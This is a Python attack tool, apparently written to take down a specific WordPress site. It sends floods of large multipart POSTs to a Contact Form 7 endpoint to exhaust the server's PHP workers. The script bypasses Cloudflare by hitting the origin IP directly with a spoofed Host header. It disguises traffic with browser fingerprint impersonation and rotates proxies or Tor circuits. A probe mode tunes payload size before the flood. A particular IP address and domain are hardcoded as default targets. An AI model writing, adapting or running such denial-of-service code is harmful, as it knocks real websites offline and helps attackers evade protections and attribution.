#!/usr/bin/env python3
"""
Upload Flood — CF7 multipart large-payload origin exhaustion
Bypasses Cloudflare by hitting origin IP directly with Host header.

Two modes:
  probe   — binary-search the server's max upload size limit
  flood   — hammer origin with near-limit payloads to exhaust PHP workers

Usage:
  python3 upload_flood.py probe --origin 104.236.68.226 --host metoo-shatkin.com --form-id 50
  python3 upload_flood.py flood  --origin 104.236.68.226 --host metoo-shatkin.com --form-id 50
  python3 upload_flood.py flood  --origin 104.236.68.226 --host metoo-shatkin.com --form-id 50 \\
                                 --size 7 --concurrency 30
"""

import argparse, os, sys, time, threading, random, string
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

try:
    from curl_cffi import requests as cf_requests
    from curl_cffi import CurlMime
    USE_CFFI = True
except ImportError:
    import requests as cf_requests
    USE_CFFI = False
    print("  [!] curl_cffi not found — falling back to requests (no TLS fingerprint spoofing)")

from proxy_pool import make_pool

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")

BROWSER_PROFILES = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.9"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
     "Accept": "application/json, text/plain, */*", "Accept-Language": "en-GB,en;q=0.8"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
     "Accept": "application/json, */*", "Accept-Language": "en-US,en;q=0.7"},
]


def _build_pool(args):
    if getattr(args, "tor", False):
        from proxy_pool import TorPool
        return TorPool()
    try:
        return make_pool(args.proxy_file)
    except FileNotFoundError:
        print(f"  {Y}[!]{W} No proxy file — sending direct (your IP)")
        return None


def cf7_url(origin, port, form_id):
    return f"http://{origin}:{port}/wp-json/contact-form-7/v1/contact-forms/{form_id}/feedback"


def random_text(size_bytes):
    """Generate random readable text of given byte size."""
    chunk = ''.join(random.choices(string.ascii_lowercase + ' \n', k=4096))
    full, rem = divmod(size_bytes, 4096)
    return chunk * full + chunk[:rem]


def send_upload(url, host, size_mb, proxy=None, timeout=45):
    """
    Send one multipart POST with a ~size_mb payload.
    Returns: (status_code, elapsed_sec, response_text, error)
    """
    headers = random.choice(BROWSER_PROFILES).copy()
    headers["Host"] = host

    payload = random_text(int(size_mb * 1024 * 1024))

    t0 = time.time()
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None

        if USE_CFFI:
            mime = CurlMime()
            mime.addpart(name="your-name",    data="Test User")
            mime.addpart(name="your-email",   data="test@example.com")
            mime.addpart(name="your-subject", data="test")
            mime.addpart(name="your-message", data=payload)
            r = cf_requests.post(
                url,
                multipart=mime,
                headers=headers,
                proxies=proxies,
                timeout=timeout,
                impersonate="chrome124",
                verify=False,
            )
        else:
            data = {
                "your-name":    "Test User",
                "your-email":   "test@example.com",
                "your-subject": "test",
                "your-message": payload,
            }
            r = cf_requests.post(
                url,
                data=data,
                headers=headers,
                proxies=proxies,
                timeout=timeout,
            )

        elapsed = time.time() - t0
        return r.status_code, elapsed, r.text[:120], None

    except Exception as e:
        elapsed = time.time() - t0
        return 0, elapsed, "", str(e)[:80]


# ─────────────────────────────────────────────────────────────────────────────
#  PROBE MODE — binary search for max upload size
# ─────────────────────────────────────────────────────────────────────────────

def probe(args):
    url = cf7_url(args.origin, args.port, args.form_id)
    print(f"""
{B}{'='*66}{W}
  Upload Probe — finding PHP post_max_size limit
{B}{'='*66}{W}
  Origin      : {args.origin}:{args.port}
  Host header : {args.host}
  Endpoint    : {url}
  Range       : 0.1 MB → {args.max_probe} MB (binary search)
{B}{'='*66}{W}
""")

    pool = _build_pool(args)

    lo, hi = 0.1, float(args.max_probe)
    last_ok_size = None

    sizes_to_test = [0.5, 1, 2, 4, 6, 7, 8, 10, 12, 16, 32]
    sizes_to_test = [s for s in sizes_to_test if s <= args.max_probe]

    for size in sizes_to_test:
        proxy = pool.next() if pool else None
        print(f"  Testing {size:>5.1f} MB ... ", end="", flush=True)
        code, elapsed, resp, err = send_upload(url, args.host, size, proxy)

        if err:
            print(f"{R}ERROR{W}  ({elapsed:.1f}s) — {err}")
        elif code == 0:
            print(f"{R}NO REPLY{W} ({elapsed:.1f}s) — server crashed/reset")
            last_ok_size = last_ok_size  # don't update
        elif code in (200, 400, 403):
            status_c = G if code == 200 else Y
            print(f"{status_c}HTTP {code}{W} ({elapsed:.1f}s) | resp: {resp[:60]}")
            last_ok_size = size
        elif code == 413:
            print(f"{R}413 Too Large{W} ({elapsed:.1f}s) — server rejected payload here")
            break
        else:
            print(f"{Y}HTTP {code}{W} ({elapsed:.1f}s) | resp: {resp[:60]}")
            last_ok_size = size

        time.sleep(0.5)

    print(f"\n{B}{'='*66}{W}")
    if last_ok_size:
        print(f"  {G}Max accepted size : ~{last_ok_size} MB{W}")
        print(f"  Recommended flood : --size {max(0.1, last_ok_size - 0.5):.1f}")
    else:
        print(f"  {R}Could not determine limit — server may be down{W}")
    print(f"{B}{'='*66}{W}\n")

    return last_ok_size


# ─────────────────────────────────────────────────────────────────────────────
#  FLOOD MODE — saturate PHP workers with large payloads
# ─────────────────────────────────────────────────────────────────────────────

def do_flood_request(req_num, url, host, size_mb, pool):
    proxy = pool.next() if pool else None
    code, elapsed, resp, err = send_upload(url, host, size_mb, proxy)
    return req_num, code, elapsed, resp, err, proxy


def flood(args):
    url     = cf7_url(args.origin, args.port, args.form_id)
    size_mb = args.size
    conc    = args.concurrency

    print(f"""
{B}{'='*66}{W}
  Upload Flood — PHP worker exhaustion via large multipart POST
{B}{'='*66}{W}
  Origin      : {args.origin}:{args.port}
  Host header : {args.host}
  Endpoint    : {url}
  Payload     : ~{size_mb} MB per request  ({size_mb * conc:.0f} MB/burst peak)
  Concurrency : {conc} workers
  Mode        : Continuous until Ctrl+C
  Strategy    : Each worker pins one PHP worker for upload duration
{B}{'='*66}{W}
""")

    pool = _build_pool(args)

    total_ok = 0; total_err = 0; burst_num = 0
    all_times = []
    start = time.time()

    try:
        while True:
            burst_num += 1
            ts = datetime.now().strftime("%H:%M:%S")

            print(f"  {C}[Burst {burst_num:>4}]{W} {ts} | "
                  f"sending {conc} × {size_mb}MB ...", end="", flush=True)

            ok = []; err_list = []; times = []
            with ThreadPoolExecutor(max_workers=conc) as ex:
                futures = {
                    ex.submit(do_flood_request, i, url, args.host, size_mb, pool): i
                    for i in range(1, conc + 1)
                }
                for f in as_completed(futures):
                    num, code, elapsed, resp, err, proxy = f.result()
                    times.append(elapsed)
                    if err:
                        err_list.append(f"ERR:{err[:30]}")
                        if pool:
                            pool.mark_dead(proxy)
                    elif code in (200, 400):
                        ok.append(code)
                    elif code == 0:
                        err_list.append("NO_REPLY(server down?)")
                    else:
                        err_list.append(f"HTTP{code}")

                    if args.verbose:
                        short = (proxy or "direct")[:25]
                        sym = G+"[✓]"+W if code in (200, 400) else R+"[✗]"+W
                        print(f"\n    {sym} Req {num:>2} | {elapsed:.1f}s | HTTP={code or 'ERR'} | {short}")

            total_ok  += len(ok)
            total_err += len(err_list)
            all_times += times
            run_t = time.time() - start
            avg_t = sum(times) / len(times) if times else 0

            avail = len(ok) / conc * 100
            if avail >= 70:   status = G + "UP" + W
            elif avail >= 20: status = Y + "DEGRADED" + W
            else:             status = R + "DOWN" + W

            print(f"\r  {C}[Burst {burst_num:>4}]{W} {ts} | "
                  f"OK={len(ok)}/{conc} | "
                  f"Avail={avail:>5.1f}% | "
                  f"AvgTime={avg_t:.1f}s | "
                  f"Status={status} | "
                  f"Runtime={run_t:.0f}s")

            if args.delay > 0:
                time.sleep(args.delay)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C\n")

    runtime = time.time() - start
    total   = total_ok + total_err
    print(f"{B}{'='*66}{W}")
    print(f"  FINAL — Upload Flood")
    print(f"{B}{'='*66}{W}")
    print(f"  Target      : {url}")
    print(f"  Host        : {args.host}")
    print(f"  Payload     : {size_mb} MB × {conc} workers")
    print(f"  Runtime     : {runtime:.0f}s")
    print(f"  Bursts      : {burst_num}")
    print(f"  Requests    : {total}")
    if total:
        print(f"  Accepted    : {total_ok} ({total_ok/total*100:.1f}%)")
        print(f"  Errors      : {total_err} ({total_err/total*100:.1f}%)")
    if all_times:
        print(f"  Avg time    : {sum(all_times)/len(all_times):.2f}s")
        print(f"  Max time    : {max(all_times):.2f}s")
    data_sent_gb = (size_mb * total) / 1024
    print(f"  Data sent   : {data_sent_gb:.2f} GB total")
    print(f"{B}{'='*66}{W}\n")


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="CF7 Upload Flood — origin bypass + large payload worker exhaustion",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("mode", choices=["probe", "flood"],
                   help="probe = find max size | flood = hammer with payloads")
    p.add_argument("--origin",      default="104.236.68.226",
                   help="Origin server IP (default: 104.236.68.226)")
    p.add_argument("--port",        type=int, default=80,
                   help="Origin port (default: 80)")
    p.add_argument("--host",        default="metoo-shatkin.com",
                   help="Host header value (default: metoo-shatkin.com)")
    p.add_argument("--form-id",     type=int, default=50,
                   help="CF7 form ID (default: 50)")
    p.add_argument("--size",        type=float, default=7.0,
                   help="[flood] Payload size in MB per request (default: 7.0)")
    p.add_argument("--concurrency", type=int, default=20,
                   help="[flood] Concurrent workers (default: 20)")
    p.add_argument("--max-probe",   type=float, default=32.0,
                   help="[probe] Max MB to test (default: 32)")
    p.add_argument("--tor",         action="store_true",
                   help="Force Tor SOCKS5 (127.0.0.1:9050), rotate circuit per request via NEWNYM")
    p.add_argument("--proxy-file",  default=PROXY_FILE,
                   help=f"Proxy list file (default: {PROXY_FILE})")
    p.add_argument("--delay",       type=float, default=0,
                   help="[flood] Seconds between bursts (default: 0)")
    p.add_argument("--verbose",     action="store_true",
                   help="Show each request result")
    args = p.parse_args()

    if args.mode == "probe":
        probe(args)
    else:
        flood(args)


if __name__ == "__main__":
    main()
